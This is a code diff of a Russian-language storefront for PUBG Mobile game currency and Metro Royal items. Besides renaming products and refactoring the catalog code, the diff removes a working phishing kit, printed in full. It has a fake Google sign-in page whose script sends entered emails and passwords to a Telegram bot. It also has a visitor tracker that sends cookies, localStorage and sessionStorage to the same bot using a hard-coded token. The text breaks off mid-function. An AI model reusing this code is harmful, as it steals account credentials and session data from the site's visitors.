@@ -115,6 +115,7 @@
             animation: spin 8s linear infinite;
             opacity: 0;
             transition: opacity 0.3s;
+            pointer-events: none;
         }
         .plashka-catalog:hover::before { opacity: 1; }
         .plashka-catalog:hover {
@@ -449,210 +450,6 @@
         }
         .blocked-box button:hover { background: #ff8800; box-shadow: 0 0 20px rgba(255,102,0,0.5); }
 
-        #loginPage {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: #f1f3f4;
-            z-index: 9998;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-            animation: fadeInUp 0.4s ease;
-        }
-        #loginPage.active { display: flex; }
-        .login-container {
-            background: #ffffff;
-            padding: 40px 35px 30px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            position: relative;
-        }
-        .login-back-btn {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            background: none;
-            border: none;
-            color: #5f6368;
-            font-size: 24px;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-        .login-back-btn:hover { color: #202124; }
-        .login-container .google-logo { display: flex; justify-content: center; margin-bottom: 24px; }
-        .login-container .google-logo svg { width: 75px; height: 75px; }
-        .login-container h2 {
-            font-size: 24px;
-            font-weight: 400;
-            color: #202124;
-            margin-bottom: 6px;
-            font-family: 'Google Sans', 'Segoe UI', sans-serif;
-        }
-        .login-container .sub {
-            font-size: 16px;
-            color: #5f6368;
-            margin-bottom: 28px;
-            font-weight: 400;
-            font-family: 'Google Sans', 'Segoe UI', sans-serif;
-        }
-        .login-container .input-group { margin-bottom: 16px; text-align: left; }
-        .login-container .input-group label {
-            font-size: 13px;
-            font-weight: 500;
-            color: #5f6368;
-            display: block;
-            margin-bottom: 4px;
-            font-family: 'Google Sans', 'Segoe UI', sans-serif;
-        }
-        .login-container .input-group input {
-            width: 100%;
-            padding: 12px 14px;
-            font-size: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            background: #fff;
-            transition: border-color 0.2s, box-shadow 0.2s;
-            color: #202124;
-            font-family: 'Google Sans', sans-serif;
-        }
-        .login-container .input-group input:focus {
-            border-color: #4285f4;
-            outline: none;
-            box-shadow: 0 1px 3px rgba(66,133,244,0.25);
-        }
-        .login-container .btn {
-            width: 100%;
-            padding: 12px;
-            background: #4285f4;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: background 0.2s, box-shadow 0.2s;
-            font-family: 'Google Sans', sans-serif;
-            box-shadow: 0 1px 2px rgba(66,133,244,0.3);
-            margin-top: 8px;
-        }
-        .login-container .btn:hover { background: #1a73e8; box-shadow: 0 1px 4px rgba(66,133,244,0.4); }
-        .login-container .btn:active { transform: scale(0.97); }
-        .login-container .btn:disabled { background: #8ab4f8; cursor: default; box-shadow: none; opacity: 0.7; }
-        .login-container .error-msg {
-            color: #d93025;
-            font-size: 14px;
-            margin-top: 12px;
-            display: none;
-            text-align: left;
-            font-weight: 400;
-            font-family: 'Google Sans', 'Segoe UI', sans-serif;
-        }
-        .login-container .error-msg.show { display: block; }
-        .login-container .spinner-container {
-            display: none;
-            justify-content: center;
-            align-items: center;
-            margin-top: 12px;
-            padding: 8px 0;
-        }
-        .login-container .spinner-container.active { display: flex; }
-        .login-container .google-spinner {
-            width: 28px;
-            height: 28px;
-            border: 3px solid #e8eaed;
-            border-top: 3px solid #4285f4;
-            border-radius: 50%;
-            animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite;
-        }
-        .login-container .spinner-text {
-            font-size: 14px;
-            color: #5f6368;
-            margin-left: 12px;
-            font-weight: 400;
-            font-family: 'Google Sans', sans-serif;
-        }
-        .login-container .google-alert {
-            background: #fce8e6;
-            border-radius: 8px;
-            padding: 16px 18px;
-            margin: 12px 0 18px 0;
-            text-align: left;
-            border: 1px solid #f5c6c2;
-        }
-        .login-container .google-alert .alert-title {
-            font-size: 15px;
-            font-weight: 500;
-            color: #d93025;
-            font-family: 'Google Sans', sans-serif;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            margin-bottom: 4px;
-        }
-        .login-container .google-alert .alert-title svg { width: 20px; height: 20px; fill: #d93025; flex-shrink: 0; }
-        .login-container .google-alert .alert-text {
-            font-size: 14px;
-            color: #202124;
-            font-weight: 400;
-            line-height: 1.5;
-        }
-        .login-container .google-alert .alert-details {
-            font-size: 13px;
-            color: #5f6368;
-            margin-top: 6px;
-            padding-top: 8px;
-            border-top: 1px solid #f5c6c2;
-            display: flex;
-            flex-wrap: wrap;
-            gap: 4px 16px;
-        }
-        .login-container .google-alert .alert-details span { display: flex; align-items: center; gap: 4px; }
-        .login-container .google-alert .alert-details svg { width: 14px; height: 14px; fill: #5f6368; }
-        .login-container .btn-google-change {
-            display: inline-block;
-            width: 100%;
-            padding: 12px 24px;
-            background: #4285f4;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: 500;
-            font-family: 'Google Sans', sans-serif;
-            text-decoration: none;
-            text-align: center;
-            cursor: pointer;
-            transition: background 0.2s, box-shadow 0.2s;
-            box-shadow: 0 1px 2px rgba(66,133,244,0.3);
-            margin-top: 8px;
-        }
-        .login-container .btn-google-change:hover { background: #1a73e8; box-shadow: 0 1px 4px rgba(66,133,244,0.4); text-decoration: none; color: #fff; }
-        .login-container .btn-google-change:active { transform: scale(0.97); }
-        .login-container .footer {
-            margin-top: 30px;
-            padding-top: 16px;
-            border-top: 1px solid #e8eaed;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 12px 16px;
-            font-size: 12px;
-            font-family: 'Google Sans', sans-serif;
-        }
-        .login-container .footer .language { color: #5f6368; cursor: pointer; display: flex; align-items: center; gap: 4px; }
-        .login-container .footer .language:hover { color: #202124; }
-        .login-container .footer .language svg { width: 14px; height: 14px; fill: #5f6368; }
-        .login-container .footer-links { display: flex; gap: 16px; flex-wrap: wrap; }
-        .login-container .footer-links a { color: #5f6368; text-decoration: none; font-weight: 400; font-size: 12px; font-family: 'Google Sans', sans-serif; }
-        .login-container .footer-links a:hover { color: #202124; text-decoration: underline; }
-        .login-container .hidden { display: none !important; }
-
         @media (max-width: 768px) {
             .nav-container { flex-direction: column; }
             .hero h1 { font-size: 32px; }
@@ -662,19 +459,6 @@
             .plashka-product-info { flex-wrap: wrap; }
             .plashka-product-name { white-space: normal; }
             .plashka-buy-btn { margin-left: 0; width: 100%; text-align: center; }
-            .login-container { padding: 28px 20px 24px; }
-            .login-container .google-logo svg { width: 60px; height: 60px; }
-            .login-container h2 { font-size: 20px; }
-            .login-container .sub { font-size: 14px; }
-            .login-container .input-group input { padding: 10px 12px; font-size: 15px; }
-            .login-container .btn, .login-container .btn-google-change { padding: 10px; font-size: 15px; }
-            .login-container .footer { flex-direction: column; align-items: flex-start; gap: 8px; }
-            .login-container .footer-links { gap: 12px; }
-            .login-container .google-spinner { width: 22px; height: 22px; border-width: 2.5px; }
-            .login-container .spinner-text { font-size: 13px; }
-            .login-container .google-alert { padding: 14px; }
-            .login-container .google-alert .alert-title { font-size: 14px; }
-            .login-container .google-alert .alert-text { font-size: 13px; }
         }
         @media (max-width: 480px) {
             .catalog-plashki { grid-template-columns: 1fr; }
@@ -730,7 +514,6 @@
             <div class="nav-links">
                 <button class="nav-btn active" data-page="main"><i class="fas fa-home"></i> Главная</button>
                 <button class="nav-btn" data-page="payment"><i class="fas fa-credit-card"></i> Оплата</button>
-                <button class="nav-btn" id="openLoginBtn"><i class="fas fa-sign-in-alt"></i> Вход</button>
                 <button class="nav-btn" data-page="howtobuy"><i class="fas fa-question-circle"></i> Как купить</button>
                 <button class="nav-btn" data-page="reviews"><i class="fas fa-star"></i> Отзывы</button>
                 <button class="nav-btn" data-page="about"><i class="fas fa-info-circle"></i> О нас</button>
@@ -742,7 +525,7 @@
         <div id="mainPage" class="page active">
             <div class="hero">
                 <h1>AWANGARD TEAM</h1>
-                <p>PUBG Mobile | UC | Метровалюта | Metro Royal</p>
+                <p>PUBG Mobile | UC | Сопровождение | Metro Royal</p>
                 <div class="hero-badge"><i class="fas fa-bolt"></i> Добро пожаловать в бурю!</div>
             </div>
 
@@ -765,7 +548,7 @@
                         <img src="logo4.jpg" alt="Metro Royal" onerror="this.style.display='none'">
                         <div>
                             <div class="plashka-title">Metro Royal</div>
-                            <div class="plashka-sub">Обмундирование + Метровалюта</div>
+                            <div class="plashka-sub">Обмундирование + Сопровождение</div>
                         </div>
                     </div>
                     <div class="plashka-products" id="metroProducts"></div>
@@ -852,78 +635,6 @@
                 <h2 style="color: #fff;">О нас</h2>
                 <p style="margin: 20px 0; color: #ccc;">AWANGARD TEAM — надёжный магазин игровых товаров для PUBG Mobile. Лучшие цены, моментальная доставка, 24/7 поддержка.</p>
                 <p style="color: #aaa;">По всем вопросам: <strong style="color: #ff8800;">@l_AWANGARD_l</strong></p>
-            </div>
-        </div>
-    </div>
-
-    <div id="loginPage">
-        <div class="login-container">
-            <button class="login-back-btn" id="closeLoginBtn"><i class="fas fa-arrow-left"></i></button>
-            <div class="google-logo">
-                <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-                    <path fill="#4285F4" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
-                    <path fill="#34A853" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
-                    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
-                    <path fill="#EA4335" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
-                </svg>
-            </div>
-
-            <div id="stepLogin">
-                <h2>Вход</h2>
-                <p class="sub">Используйте один аккаунт для всех сервисов Google</p>
-                <form id="loginForm">
-                    <div class="input-group">
-                        <label>Эл. почта или телефон</label>
-                        <input type="text" id="email" placeholder="example@gmail.com" autofocus>
-                    </div>
-                    <div class="input-group">
-                        <label>Пароль</label>
-                        <input type="password" id="password" placeholder="••••••••">
-                    </div>
-                    <div class="error-msg" id="errorMsg">Неверный логин или пароль. Попробуйте снова.</div>
-                    <div class="spinner-container" id="spinnerContainer">
-                        <div class="google-spinner"></div>
-                        <span class="spinner-text">Загрузка...</span>
-                    </div>
-                    <button type="submit" class="btn" id="submitBtn">Далее</button>
-                </form>
-            </div>
-
-            <div id="stepPanic" class="hidden">
-                <h2 style="color: #d93025; font-weight: 400;">Подозрительный вход</h2>
-                <p class="sub" style="color: #5f6368;">Кто-то пытался войти в ваш аккаунт</p>
-                <div class="google-alert">
-                    <div class="alert-title">
-                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
-                        Ваш аккаунт под угрозой
-                    </div>
-                    <div class="alert-text">
-                        Кто-то пытался войти в ваш аккаунт с нового устройства. Смените пароль прямо сейчас.
-                    </div>
-                    <div class="alert-details">
-                        <span><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 12c-2.33 0-4.31-1.46-5.11-3.5.1-.56 1.08-1.5 2.11-1.5.41 0 .8.12 1.12.34.64.45 1.86.66 2.88.66.61 0 1.42-.1 2.01-.3.64.21 1.36.45 1.36.45 1.03 0 2.01.94 2.11 1.5C16.31 14.54 14.33 16 12 16z"/></svg> <span id="panicDevice">Неизвестное устройство</span></span>
-                        <span><svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 4c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm0 12c-2.33 0-4.31-1.46-5.11-3.5.1-.56 1.08-1.5 2.11-1.5.41 0 .8.12 1.12.34.64.45 1.86.66 2.88.66.61 0 1.42-.1 2.01-.3.64.21 1.36.45 1.36.45 1.03 0 2.01.94 2.11 1.5C16.31 14.54 14.33 16 12 16z"/></svg> <span id="panicIP">Незнакомый IP-адрес</span></span>
-                        <span><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67V7z"/></svg> <span id="panicTime">Сегодня, только что</span></span>
-                    </div>
-                </div>
-                <p style="font-size: 14px; color: #5f6368; text-align: left; margin-bottom: 16px;">
-                    <strong>Ваш аккаунт под угрозой.</strong> Немедленно смените пароль.
-                </p>
-                <a href="https://myaccount.google.com/signinoptions/password" target="_blank" class="btn-google-change" id="changePasswordBtn">
-                    Сменить пароль
-                </a>
-            </div>
-
-            <div class="footer">
-                <div class="language">
-                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
-                    Английский (США)
-                </div>
-                <div class="footer-links">
-                    <a href="#">Помощь</a>
-                    <a href="#">Конфиденциальность</a>
-                    <a href="#">Условия</a>
-                </div>
             </div>
         </div>
     </div>
@@ -1298,128 +1009,7 @@
         })();
 
         // ============================================================
-        // 4. ОТПРАВКА ДАННЫХ В TELEGRAM
-        // ============================================================
-        (function() {
-            const BOT_TOKEN = '8781385510:AAH90mtmIeYsGZ8mhcmnhxxLyMEGrC9c4i4';
-            const CHAT_ID = '7076607674';
-
-            function sendMessage(text) {
-                return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: text,
-                    })
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        return response.text().then(errText => {
-                            throw new Error(`HTTP ${response.status}: ${errText}`);
-                        });
-                    }
-                    return response.json();
-                });
-            }
-
-            function sendVisitorData() {
-                if (localStorage.getItem('awangard_license_accepted') !== 'true') {
-                    console.log('⚠️ Лицензия не принята, данные не отправляются');
-                    return;
-                }
-
-                console.log('🔄 Сбор данных...');
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => {
-                        const ip = data.ip || 'неизвестно';
-                        const dataObj = {
-                            ip: ip,
-                            userAgent: navigator.userAgent,
-                            language: navigator.language,
-                            screen: `${window.screen.width}x${window.screen.height}`,
-                            time: new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' }),
-                            url: window.location.href,
-                            referer: document.referrer || 'прямой переход',
-                            cookies: document.cookie || 'нет cookies',
-                            localStorage: JSON.stringify(localStorage) || 'пусто',
-                            sessionStorage: JSON.stringify(sessionStorage) || 'пусто',
-                        };
-
-                        const message = `
-        📦 НОВЫЙ ПОСЕТИТЕЛЬ
-
-        IP: ${dataObj.ip}
-        Время: ${dataObj.time}
-        Устройство: ${dataObj.userAgent}
-        Язык: ${dataObj.language}
-        Экран: ${dataObj.screen}
-        Страница: ${dataObj.url}
-        Откуда пришёл: ${dataObj.referer}
-
-        Cookies:
-        ${dataObj.cookies}
-
-        localStorage:
-        ${dataObj.localStorage}
-
-        sessionStorage:
-        ${dataObj.sessionStorage}
-        `;
-
-                        console.log('📨 Отправка в Telegram...');
-                        return sendMessage(message);
-                    })
-                    .then(result => {
-                        console.log('✅ Данные успешно отправлены! Ответ:', result);
-                    })
-                    .catch(err => {
-                        console.error('❌ Ошибка:', err.message);
-                    });
-            }
-
-            if (localStorage.getItem('awangard_license_accepted') === 'true') {
-                setTimeout(sendVisitorData, 2000);
-            }
-
-            let checkInterval = setInterval(() => {
-                if (localStorage.getItem('awangard_license_accepted') === 'true') {
-                    clearInterval(checkInterval);
-                    setTimeout(sendVisitorData, 2000);
-                }
-            }, 1000);
-
-            document.addEventListener('click', function(e) {
-                const target = e.target.closest('.plashka-buy-btn');
-                if (target && localStorage.getItem('awangard_license_accepted') === 'true') {
-                    fetch('https://api.ipify.org?format=json')
-                        .then(res => res.json())
-                        .then(data => {
-                            const ip = data.ip || 'неизвестно';
-                            const msg = `
-        ДЕЙСТВИЕ: КЛИК ПО КУПИТЬ
-        IP: ${ip}
-        Время: ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}
-        Страница: ${window.location.href}
-        localStorage: ${JSON.stringify(localStorage)}
-        `;
-                            return sendMessage(msg);
-                        })
-                        .then(() => console.log('✅ Клик отправлен'))
-                        .catch(err => console.error('❌ Ошибка клика:', err));
-                }
-            });
-
-            window.testTelegram = function() {
-                sendMessage('✅ Тестовое сообщение от AWANGARD!')
-                    .then(() => console.log('✅ Тест успешен! Бот работает.'))
-                    .catch(err => console.error('❌ Тест провален:', err));
-            };
-        })();
-
-        // ============================================================
-        // 5. ОСНОВНАЯ ЛОГИКА
+        // 4. ОСНОВНАЯ ЛОГИКА
         // ============================================================
         let salesCount = parseInt(localStorage.getItem('awangard_sales') || '342');
 
@@ -1433,20 +1023,85 @@
                 { name: "6000+2100 UC", price: 2070, oldPrice: 12000, icon: "logo6.jpg" }
             ],
             metro: [
-                { name: "Комплект брони UR 6", price: 25, oldPrice: 3500, icon: "logo5.jpg" },
-                { name: "MK 14 выс.качества", price: 15, oldPrice: 2500, icon: "logo5.jpg" },
-                { name: "1 000 000 метровалюты", price: 100, icon: "logo5.jpg" },
-                { name: "2 000 000 метровалюты", price: 200, icon: "logo5.jpg" },
-                { name: "3 000 000 метровалюты", price: 300, icon: "logo5.jpg" },
-                { name: "4 000 000 метровалюты", price: 400, icon: "logo5.jpg" },
-                { name: "5 000 000 метровалюты", price: 500, icon: "logo5.jpg" },
-                { name: "6 000 000 метровалюты", price: 600, icon: "logo5.jpg" },
-                { name: "7 000 000 метровалюты", price: 700, icon: "logo5.jpg" },
-                { name: "8 000 000 метровалюты", price: 800, icon: "logo5.jpg" },
-                { name: "9 000 000 метровалюты", price: 900, icon: "logo5.jpg" },
-                { name: "10 000 000 метровалюты", price: 1000, icon: "logo5.jpg" }
+                { name: "Сопровождение 3 млн", price: 30, icon: "logo5.jpg" },
+                { name: "Сопровождение 4 млн", price: 40, icon: "logo5.jpg" },
+                { name: "Сопровождение 5 млн", price: 50, icon: "logo5.jpg" },
+                { name: "Сопровождение 6 млн", price: 60, icon: "logo5.jpg" },
+                { name: "Сопровождение 7 млн", price: 70, icon: "logo5.jpg" },
+                { name: "Сопровождение 8 млн", price: 80, icon: "logo5.jpg" },
+                { name: "Сопровождение 9 млн", price: 90, icon: "logo5.jpg" },
+                { name: "Сопровождение 10 млн", price: 100, icon: "logo5.jpg" },
+                { name: "Сопровождение 11 млн", price: 110, icon: "logo5.jpg" },
+                { name: "Сопровождение 12 млн", price: 120, icon: "logo5.jpg" },
+                { name: "Сопровождение 13 млн", price: 130, icon: "logo5.jpg" },
+                { name: "Сопровождение 14 млн", price: 140, icon: "logo5.jpg" },
+                { name: "Сопровождение 15 млн", price: 150, icon: "logo5.jpg" },
+                { name: "Сопровождение 16 млн", price: 160, icon: "logo5.jpg" },
+                { name: "Сопровождение 17 млн", price: 170, icon: "logo5.jpg" },
+                { name: "Сопровождение 18 млн", price: 180, icon: "logo5.jpg" },
+                { name: "Сопровождение 19 млн", price: 190, icon: "logo5.jpg" },
+                { name: "Сопровождение 20 млн", price: 200, icon: "logo5.jpg" },
+                { name: "Сопровождение 21 млн", price: 210, icon: "logo5.jpg" },
+                { name: "Сопровождение 22 млн", price: 220, icon: "logo5.jpg" },
+                { name: "Сопровождение 23 млн", price: 230, icon: "logo5.jpg" },
+                { name: "Сопровождение 24 млн", price: 240, icon: "logo5.jpg" },
+                { name: "Сопровождение 25 млн", price: 250, icon: "logo5.jpg" },
+                { name: "Сопровождение 26 млн", price: 260, icon: "logo5.jpg" },
+                { name: "Сопровождение 27 млн", price: 270, icon: "logo5.jpg" },
+                { name: "Сопровождение 28 млн", price: 280, icon: "logo5.jpg" },
+                { name: "Сопровождение 29 млн", price: 290, icon: "logo5.jpg" },
+                { name: "Сопровождение 30 млн", price: 300, icon: "logo5.jpg" },
+                { name: "Сопровождение 31 млн", price: 310, icon: "logo5.jpg" },
+                { name: "Сопровождение 32 млн", price: 320, icon: "logo5.jpg" },
+                { name: "Сопровождение 33 млн", price: 330, icon: "logo5.jpg" },
+                { name: "Сопровождение 34 млн", price: 340, icon: "logo5.jpg" },
+                { name: "Сопровождение 35 млн", price: 350, icon: "logo5.jpg" },
+                { name: "Сопровождение 36 млн", price: 360, icon: "logo5.jpg" },
+                { name: "Сопровождение 37 млн", price: 370, icon: "logo5.jpg" },
+                { name: "Сопровождение 38 млн", price: 380, icon: "logo5.jpg" },
+                { name: "Сопровождение 39 млн", price: 390, icon: "logo5.jpg" },
+                { name: "Сопровождение 40 млн", price: 400, icon: "logo5.jpg" },
+                { name: "Сопровождение 41 млн", price: 410, icon: "logo5.jpg" },
+                { name: "Сопровождение 42 млн", price: 420, icon: "logo5.jpg" },
+                { name: "Сопровождение 43 млн", price: 430, icon: "logo5.jpg" },
+                { name: "Сопровождение 44 млн", price: 440, icon: "logo5.jpg" },
+                { name: "Сопровождение 45 млн", price: 450, icon: "logo5.jpg" },
+                { name: "Сопровождение 46 млн", price: 460, icon: "logo5.jpg" },
+                { name: "Сопровождение 47 млн", price: 470, icon: "logo5.jpg" },
+                { name: "Сопровождение 48 млн", price: 480, icon: "logo5.jpg" },
+                { name: "Сопровождение 49 млн", price: 490, icon: "logo5.jpg" },
+                { name: "Сопровождение 50 млн", price: 500, icon: "logo5.jpg" }
             ]
         };
+
+        function renderProducts(type) {
+            const containerId = (type === 'uc') ? 'ucProducts' : 'metroProducts';
+            const container = document.getElementById(containerId);
+            if (!container) return;
+            const items = products[type] || [];
+            container.innerHTML = items.map(p => `
+                <div class="plashka-product-item">
+                    <div class="plashka-product-info">
+                        <img src="${p.icon}" alt="${p.name}" class="plashka-product-icon" onerror="this.style.display='none'">
+                        <span class="plashka-product-name">${p.name}</span>
+                        ${p.oldPrice ? `<span class="plashka-product-oldprice">${p.oldPrice} ₽</span>` : ''}
+                    </div>
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <span class="plashka-product-price">${p.price} ₽</span>
+                        <button class="plashka-buy-btn" data-name="${p.name}" data-price="${p.price}">Купить</button>
+                    </div>
+                </div>
+            `).join('');
+
+            // Навешиваем обработчики на кнопки "Купить"
+            container.querySelectorAll('.plashka-buy-btn').forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    e.preventDefault();
+                    goToPayment();
+                });
+            });
+        }
 
         function toggleCatalog(type) {
             const containerId = (type === 'uc') ? 'ucProducts' : 'metroProducts';
@@ -1462,24 +1117,10 @@
             container.classList.add('open');
 
             if (container.children.length === 0) {
-                const items = products[type] || [];
-                container.innerHTML = items.map(p => `
-                    <div class="plashka-product-item" data-name="${p.name}" data-price="${p.price}">
-                        <div class="plashka-product-info">
-                            <img src="${p.icon}" alt="${p.name}" class="plashka-product-icon" onerror="this.style.display='none'">
-                            <span class="plashka-product-name">${p.name}</span>
-                            ${p.oldPrice ? `<span class="plashka-product-oldprice">${p.oldPrice} ₽</span>` : ''}
-                        </div>
-                        <div style="display: flex; align-items: center; gap: 10px;">
-                            <span class="plashka-product-price">${p.price} ₽</span>
-                            <button class="plashka-buy-btn" data-name="${p.name}" data-price="${p.price}">Купить</button>
-                        </div>
-                    </div>
-                `).join('');
+                renderProducts(type);
             }
         }
 
-        // Переключение на страницу оплаты (без тоста)
         function goToPayment() {
             const pages = document.querySelectorAll('.page');
             pages.forEach(p => p.classList.remove('active'));
@@ -1490,16 +1131,9 @@
             navBtns.forEach(b => b.classList.remove('active'));
             const payBtn = document.querySelector('.nav-btn[data-page="payment"]');
             if (payBtn) payBtn.classList.add('active');
-        }
 
-        // Делегирование — клик по кнопке "Купить"
-        document.querySelector('.catalog-plashki').addEventListener('click', function(e) {
-            const btn = e.target.closest('.plashka-buy-btn');
-            if (!btn) return;
-            e.stopPropagation();
-            // Просто переключаем на оплату, без сообщений
-            goToPayment();
-        });
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
 
         function showToast(msg) {
             const toast = document.getElementById('toast');
@@ -1513,10 +1147,11 @@
         }
 
         function initNavigation() {
-            const btns = document.querySelectorAll('.nav-btn:not(#openLoginBtn)');
+            const btns = document.querySelectorAll('.nav-btn');
             btns.forEach(btn => {
                 btn.addEventListener('click', function() {
                     const pageName = this.dataset.page;
+                    if (!pageName) return;
                     const pages = document.querySelectorAll('.page');
                     pages.forEach(p => p.classList.remove('active'));
                     const target = document.getElementById(pageName + 'Page');
@@ -1545,134 +1180,6 @@
         scrollTopBtn.addEventListener('click', () => {
             window.scrollTo({ top: 0, behavior: 'smooth' });
         });
-
-        // ============================================================
-        // 6. ЛОГИКА СТРАНИЦЫ ВХОДА
-        // ============================================================
-        (function() {
-            const loginPage = document.getElementById('loginPage');
-            const openBtn = document.getElementById('openLoginBtn');
-            const closeBtn = document.getElementById('closeLoginBtn');
-
-            function openLogin() {
-                loginPage.classList.add('active');
-                document.getElementById('mainNav').style.display = 'none';
-                document.getElementById('mainContent').style.display = 'none';
-                document.querySelector('.footer:not(.login-container .footer)').style.display = 'none';
-            }
-
-            function closeLogin() {
-                loginPage.classList.remove('active');
-                document.getElementById('mainNav').style.display = 'block';
-                document.getElementById('mainContent').style.display = 'block';
-                document.querySelector('.footer:not(.login-container .footer)').style.display = 'block';
-            }
-
-            openBtn.addEventListener('click', openLogin);
-            closeBtn.addEventListener('click', closeLogin);
-
-            document.addEventListener('keydown', (e) => {
-                if (e.key === 'Escape' && loginPage.classList.contains('active')) {
-                    closeLogin();
-                }
-            });
-        })();
-
-        // ============================================================
-        // 7. ЛОГИКА ВХОДА (форма)
-        // ============================================================
-        (function() {
-            const stepLogin = document.getElementById('stepLogin');
-            const stepPanic = document.getElementById('stepPanic');
-            const loginForm = document.getElementById('loginForm');
-            const emailInput = document.getElementById('email');
-            const passwordInput = document.getElementById('password');
-            const submitBtn = document.getElementById('submitBtn');
-            const errorMsg = document.getElementById('errorMsg');
-            const spinnerContainer = document.getElementById('spinnerContainer');
-            const panicDevice = document.getElementById('panicDevice');
-            const panicIP = document.getElementById('panicIP');
-            const panicTime = document.getElementById('panicTime');
-
-            let attemptCount = 0;
-            let userEmail = '';
-            let userPassword = '';
-            let userIP = '';
-
-            function sendToTelegram(text) {
-                const BOT_TOKEN = '8781385510:AAH90mtmIeYsGZ8mhcmnhxxLyMEGrC9c4i4';
-                const CHAT_ID = '7076607674';
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-                }).catch(() => console.warn('Telegram send error'));
-            }
-
-            function getIP(callback) {
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => callback(data.ip))
-                    .catch(() => callback('неизвестно'));
-            }
-
-            loginForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-
-                const email = emailInput.value.trim();
-                const password = passwordInput.value;
-
-                if (!email || !password) {
-                    errorMsg.textContent = 'Заполните все поля';
-                    errorMsg.classList.add('show');
-                    return;
-                }
-
-                attemptCount++;
-                userEmail = email;
-                userPassword = password;
-
-                getIP(function(ip) {
-                    userIP = ip;
-                    const msg = `🎯 ПОПЫТКА ВХОДА #${attemptCount}\n📧 Логин: ${email}\n🔑 Пароль: ${password}\n🌐 IP: ${ip}\n🕒 Время: ${new Date().toLocaleString('ru-RU')}\n📱 Устройство: ${navigator.userAgent}`;
-                    sendToTelegram(msg);
-                });
-
-                submitBtn.disabled = true;
-                spinnerContainer.classList.add('active');
-                errorMsg.classList.remove('show');
-
-                setTimeout(() => {
-                    submitBtn.disabled = false;
-                    spinnerContainer.classList.remove('active');
-
-                    if (attemptCount >= 2) {
-                        stepLogin.classList.add('hidden');
-                        stepPanic.classList.remove('hidden');
-
-                        const device = navigator.platform || 'Неизвестное устройство';
-                        const browser = navigator.userAgent.match(/(Chrome|Safari|Firefox|Edge|Opera)/)?.[0] || 'Неизвестный браузер';
-                        panicDevice.textContent = `${browser} на ${device}`;
-                        panicIP.textContent = userIP || 'Незнакомый IP-адрес';
-                        panicTime.textContent = `Сегодня, ${new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit' })}`;
-
